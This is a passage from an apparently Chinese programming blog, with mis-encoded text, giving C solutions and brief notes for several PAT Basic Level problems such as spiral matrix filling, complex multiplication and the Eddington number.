class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[<span class="number">100000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> ans[<span class="number">100000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a, <span class="keyword">const</span> <span class="keyword">void</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> *(<span class="keyword">int</span> *)b - *(<span class="keyword">int</span> *)a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">filling</span><span class="params">(<span class="keyword">int</span> *ans, <span class="keyword">int</span> *a, <span class="keyword">int</span> m, <span class="keyword">int</span> n, <span class="keyword">int</span> N)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, level = m/<span class="number">2</span>+m%<span class="number">2</span>, t = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; level; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = i; j &lt;= n<span class="number">-1</span>-i &amp;&amp; t &lt;= N<span class="number">-1</span>; j++)</span><br><span class="line">ans[i*n+j] = a[t++];</span><br><span class="line"><span class="keyword">for</span>(j = i+<span class="number">1</span>; j &lt;= m<span class="number">-2</span>-i &amp;&amp; t &lt;= N<span class="number">-1</span>; j++)</span><br><span class="line">ans[j*n+n<span class="number">-1</span>-i] = a[t++];</span><br><span class="line"><span class="keyword">for</span>(j = n<span class="number">-1</span>-i; j &gt;= i &amp;&amp; t &lt;= N<span class="number">-1</span>; j--)</span><br><span class="line">ans[(m<span class="number">-1</span>-i)*n+j] = a[t++];</span><br><span class="line"><span class="keyword">for</span>(j = m<span class="number">-2</span>-i; j &gt;= i+<span class="number">1</span> &amp;&amp; t &lt;= N<span class="number">-1</span>; j--)</span><br><span class="line">ans[j*n+i] =  a[t++];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> N = <span class="number">0</span>, m = <span class="number">0</span>, n = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">n = (<span class="keyword">int</span>)<span class="built_in">sqrt</span>(N);</span><br><span class="line"><span class="keyword">while</span>(n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(N%n == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">m = N/n;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">n--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, a+i);</span><br><span class="line">qsort(a, N, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), cmp);</span><br><span class="line"></span><br><span class="line">filling(ans, a, m, n, N);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, ans[i*n+j]);</span><br><span class="line"><span class="keyword">if</span>(j != n<span class="number">-1</span>)</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">32</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1051-å¤æ•°ä¹˜æ³•"><a href="#1051-å¤æ•°ä¹˜æ³•" class="headerlink" title="1051 å¤æ•°ä¹˜æ³•"></a>1051 å¤æ•°ä¹˜æ³•</h3><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200730104434939.png" alt="image-20200730104434939"></p><p>ä¸ºä»€ä¹ˆPATçš„é¢˜æœ‰è¿™ä¹ˆå¤šå‘ã€‚ã€‚é¦–å…ˆè¿™é‡Œçš„ç»™çš„è¾è§’å·²ç»æ˜¯å¼§åº¦åˆ¶äº†ï¼Œæ‰€ä»¥ä¸ç”¨è½¬æ¢ï¼›å…¶æ¬¡å°±æ˜¯ç»“æœä¿ç•™2ä½å°æ•°ï¼Œé‚£å½“ç»“æœå°äº0ä½†å¤§äº-0.01æ—¶ï¼Œæ¯”å¦‚-0.001ï¼Œè¿™æ—¶å€™ä¿ç•™2ä½å°æ•°å°±åªæœ‰0ï¼Œæ‰€ä»¥æœ€åè¾“å‡ºçš„æ—¶å€™ä¹Ÿä¸åº”è¯¥æœ‰è´Ÿå·ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">double</span> r1 = <span class="number">0</span>, p1 = <span class="number">0</span>, r2 = <span class="number">0</span>, p2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">double</span> a1 = <span class="number">0</span>, b1 = <span class="number">0</span>, a2 = <span class="number">0</span>, b2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">double</span> ans1 = <span class="number">0</span>, ans2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%lf %lf %lf %lf"</span>, &amp;r1, &amp;p1, &amp;r2, &amp;p2);</span><br><span class="line">a1 = r1*<span class="built_in">cos</span>(p1);</span><br><span class="line">b1 = r1*<span class="built_in">sin</span>(p1);</span><br><span class="line">a2 = r2*<span class="built_in">cos</span>(p2);</span><br><span class="line">b2 = r2*<span class="built_in">sin</span>(p2);</span><br><span class="line">ans1 = a1*a2+(<span class="number">-1</span>)*b1*b2;</span><br><span class="line">ans2 = a1*b2+a2*b1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ans1 &lt; <span class="number">0</span> &amp;&amp; ans1 &gt; <span class="number">-0.01</span>)</span><br><span class="line">ans1 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(ans2 &lt; <span class="number">0</span> &amp;&amp; ans2 &gt; <span class="number">-0.01</span>)</span><br><span class="line">ans2 = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%.2lf"</span>, ans1);</span><br><span class="line"><span class="keyword">if</span>(ans2 &gt;= <span class="number">0</span>)</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">'+'</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%.2lfi"</span>, ans2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1052-å–ä¸ªèŒ"><a href="#1052-å–ä¸ªèŒ" class="headerlink" title="1052 å–ä¸ªèŒ"></a>1052 å–ä¸ªèŒ</h3><p><strong>è€ƒç‚¹ï¼šå­—ç¬¦ä¸²çš„åˆ†å‰²ï¼Œä½¿ç”¨ä¸€ä¸ªæŒ‡é’ˆæ•°ç»„æ¥å­˜å‚¨åœ°å€ã€‚</strong></p><p>å†™å®Œï¼Œåœ¨æœ¬åœ°Cè¯­è¨€ç¯å¢ƒå‘ç°VCä¸DEVCä¸€å¾—ä¸åˆ°æ­£ç¡®çš„ç»“æœï¼Œè°ƒå¼æ‰å‘ç°è¿™2ä¸ªç¯å¢ƒéƒ½ä¸èƒ½è¯†åˆ«è¾“å…¥çš„è¡¨æƒ…ç¬¦å·ï¼Œç„¶åéƒ½ä»¥0æ¥å¡«å……ã€‚è¿™ä¹Ÿæ˜¯æœ¬é¢˜æˆ‘çš„éš¾ç‚¹ï¼Œæ‰¾é”™åŠå¤©ã€‚ã€‚ã€‚</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200731114402392.png" alt="image-20200731114402392"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">char</span> *a[], <span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(s[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(s[i] == <span class="string">'['</span>)</span><br><span class="line">a[j++] = s+i+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(s[i] == <span class="string">']'</span>)</span><br><span class="line">s[i] = <span class="string">'\0'</span>;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *a[<span class="number">3</span>][<span class="number">100</span>] = &#123;<span class="literal">NULL</span>&#125;, s[<span class="number">3</span>][<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> zs, zy, k, yy, ys;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">gets(s[i]);</span><br><span class="line">fun(a[i], s[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"><span class="keyword">while</span>(n--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d %d %d %d"</span>, &amp;zs, &amp;zy, &amp;k, &amp;yy, &amp;ys);</span><br><span class="line"><span class="keyword">if</span>(!a[<span class="number">0</span>][zs<span class="number">-1</span>] || !a[<span class="number">0</span>][ys--] || !a[<span class="number">1</span>][zy<span class="number">-1</span>] || !a[<span class="number">1</span>][yy<span class="number">-1</span>] || !a[<span class="number">2</span>][k])</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Are you kidding me? @\\/@\n"</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s%s%s%s%s"</span>, a[<span class="number">0</span>][zs<span class="number">-1</span>], a[<span class="number">1</span>][zy<span class="number">-1</span>], a[<span class="number">2</span>][k], a[<span class="number">1</span>][yy<span class="number">-1</span>], a[<span class="number">0</span>][ys<span class="number">-1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åï¼šè¿˜æœ‰ä¸€ä¸ªæ³¨æ„çš„åœ°æ–¹å°±æ˜¯ï¼Œä½¿ç”¨æŒ‡é’ˆæ•°ç»„å­˜æ”¾ä¸€ä¸ªæ•°ç»„çš„æŒ‡é’ˆå­—ç¬¦ä¸²çš„åœ°å€åï¼Œè¯¥æ•°ç»„ä¸èƒ½æ”¹å˜å•Šã€‚å¤§æ„å°±å®¹æ˜“å‡ºé”™ã€‚</p><h3 id="1054-æ±‚å¹³å‡å€¼"><a href="#1054-æ±‚å¹³å‡å€¼" class="headerlink" title="1054 æ±‚å¹³å‡å€¼"></a>1054 æ±‚å¹³å‡å€¼</h3><p>è¿™ä¸ªé¢˜å¼€å§‹è‡ªå·±äº†åˆ¤æ–­æ˜¯å¦æ˜¯åˆæ³•æ•°æ®çš„å‡½æ•°ï¼Œä½†ä¸€åªæœ‰ä¸€ä¸ªæµ‹è¯•ç‚¹è¿‡ä¸äº†ï¼Œå°±å¼€å§‹æ‰¾åˆ¤æ–­å‡½æ•°çš„é—®é¢˜ï¼Œæœç„¶æœ‰é—®é¢˜ï¼Œä½†ä¿®æ”¹åä»ç„¶æœ‰æµ‹è¯•ç‚¹è¿‡ä¸äº†ã€‚</p><p>åŸæ¥å› ä¸ºé¢˜ä¸ä¸­çš„ä¸€å¥è¯ï¼šå¦‚æœ <code>K</code> ä¸º 1ï¼Œåˆ™è¾“å‡º <code>The average of 1 number is Y</code>ï¼Œè¿™é‡Œçš„numberæ˜¯å•æ•°ã€‚ã€‚ã€‚</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200805103116143.png" alt="image-20200805103116143"></p><p>å¦å¤–å°±æ˜¯è¿™ä¸ªé¢˜ï¼Œç›´æ¥ç”¨sscanfä¸sprintfå¯¹æ•°æ®è¿›è¡Œç›¸äº’è½¬æ¢ï¼Œå¦‚æœä¸ç›¸ç­‰åˆ™ä¸åˆæ³•ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;, t[<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, count = <span class="number">0</span>, i = <span class="number">0</span>, flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">double</span> sum = <span class="number">0</span>, temp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"><span class="keyword">while</span>(n--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>, s);</span><br><span class="line"></span><br><span class="line"><span class="built_in">sscanf</span>(s, <span class="string">"%lf"</span>, &amp;temp);</span><br><span class="line"><span class="built_in">sprintf</span>(t, <span class="string">"%.2lf"</span>, temp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); i++)</span><br><span class="line"><span class="keyword">if</span>(s[i] != t[i])</span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(!flag &amp;&amp; temp &gt;= <span class="number">-1000</span> &amp;&amp; temp &lt;= <span class="number">1000</span>)</span><br><span class="line">sum += temp, count++;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: %s is not a legal number\n"</span>, s);</span><br><span class="line"><span class="built_in">strcpy</span>(s, <span class="string">""</span>), flag = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(count == <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The average of 1 number is %.2lf"</span>, sum/count);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(count)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The average of %d numbers is %.2lf"</span>, count, sum/count);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The average of 0 numbers is Undefined"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1060-çˆ±ä¸é¡¿æ•°"><a href="#1060-çˆ±ä¸é¡¿æ•°" class="headerlink" title="1060 çˆ±ä¸é¡¿æ•°"></a>1060 çˆ±ä¸é¡¿æ•°</h3><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200808093106281.png" alt="image-20200808093106281"></p><p>éš¾åœ¨é¢˜ç›®æ„æ€å¼€å§‹æ²¡æœ‰ç†è§£ã€‚å…¶å®å°±æ˜¯è®©æˆ‘ä»¬æ‰¾åˆ°ç»™å®šéª‘è½¦å¤©æ•°ä¸­ï¼ŒEå¤©éª‘è½¦è¶…è¿‡Eè‹±é‡Œçš„æœ€å¤§Eã€‚å¦‚ç»™å®šçš„ä¾‹å­ï¼Œåœ¨ç»™å®š10å¤©éª‘è½¦ä¸­ï¼Œæœ‰6å¤©éª‘è½¦éƒ½è¶…è¿‡6è‹±é‡Œã€‚ä¸”è¿™ä¸ª6æ˜¯èƒ½æ‰¾åˆ°æœ€å¤§çš„ã€‚</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200808093430888.png" alt="image-20200808093430888"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a, <span class="keyword">const</span> <span class="keyword">void</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> *(<span class="keyword">int</span> *)a &gt; *(<span class="keyword">int</span> *)b ? <span class="number">-1</span>:<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, i = <span class="number">1</span>, a[<span class="number">100001</span>], ans = <span class="number">0</span>, p = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, a+i);</span><br><span class="line">qsort(a+<span class="number">1</span>, n, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), cmp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(ans &lt;= n &amp;&amp; a[p] &gt; p)</span><br><span class="line">ans++, p++;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, ans);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1062-æœ€ç®€åˆ†æ•°"><a href="#1062-æœ€ç®€åˆ†æ•°" class="headerlink" title="1062 æœ€ç®€åˆ†æ•°"></a>1062 æœ€ç®€åˆ†æ•°</h3><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200810094130936.png" alt="image-20200810094130936"></p><p>å°±æ˜¯ä¸Šé¢çš„ä¸€ä¸ªå‘ç‚¹ã€‚ã€‚ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> b == <span class="number">0</span> ? a : gcd(b, a%b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">double</span> *a, <span class="keyword">double</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">double</span> temp = *a;</span><br><span class="line">*a = *b;</span><br><span class="line">*b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, count = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">double</span> a, a1, b, b1;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%lf/%lf %lf/%lf %d"</span>, &amp;a, &amp;a1, &amp;b, &amp;b1, &amp;k);</span><br><span class="line">a *= k/a1, b *= k/b1;</span><br><span class="line"><span class="keyword">if</span>(a &gt; b)</span><br><span class="line">swap(&amp;a, &amp;b);</span><br><span class="line">b = b&gt;(<span class="keyword">int</span>)b ? b+<span class="number">1</span>:b;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = (<span class="keyword">int</span>)a+<span class="number">1</span>; i &lt; (<span class="keyword">int</span>)b; i++)</span><br><span class="line"><span class="keyword">if</span>(gcd(i, k) == <span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span>(count == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d/%d"</span>, i, k), count = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %d/%d"</span>, i, k);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1065-å•èº«ç‹—"><a href="#1065-å•èº«ç‹—" class="headerlink" title="1065 å•èº«ç‹—"></a>1065 å•èº«ç‹—</h3><p>çœŸçš„åäº†ï¼Œåˆæ˜¯è¢«PATä¹™çº§è¾“å‡ºæ ¼å¼æ‰¾äº†åŠå¤©é”™ã€‚</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200813103816746.png" alt="image-20200813103816746"></p><p>å¦å¤–å°±æ˜¯ï¼Œè¿˜æ˜¯0ä½œæ€ªã€‚ã€‚æˆ‘ç”¨0åšå­˜æ”¾å¤«å¦»æ•°ç»„çš„åˆå§‹åŒ–ï¼Œè®©å¤«å¦»è¾¾åˆ°ç›¸äº’æ˜ å°„å…³ç³»ï¼Œä½†æ˜¯å¿˜äº†æœ‰å¤«å¦»çš„idæ˜¯0å•Šã€‚ã€‚ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 